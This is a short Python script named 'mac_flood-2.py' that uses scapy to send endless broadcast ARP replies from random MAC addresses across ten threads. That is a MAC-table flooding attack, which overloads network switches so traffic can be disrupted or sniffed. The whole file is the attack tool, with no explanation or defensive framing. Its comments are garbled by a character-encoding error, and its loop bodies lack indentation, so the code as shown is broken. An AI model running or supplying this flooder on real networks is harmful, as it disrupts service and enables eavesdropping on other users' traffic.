#mac_flood-2.py
#!/usr/bin/python
from scapy.all import *
import threading

#ѭ����ARP��
def FB(x): 
    while 1:
    sendp(Ether(src=RandMAC(),dst="FF:FF:FF:FF:FF:FF")/ARP(op=2,psrc="0.0.0.0",hwdst="FF:FF:FF:FF:FF:FF")/Padding(load="X"*18))

#���߳�
def DX(dx):
    for i in range(dx):
    s=threading.Thread(target=FB,args=(i,))
    s.start()

if __name__=="__main__":
    DX(10)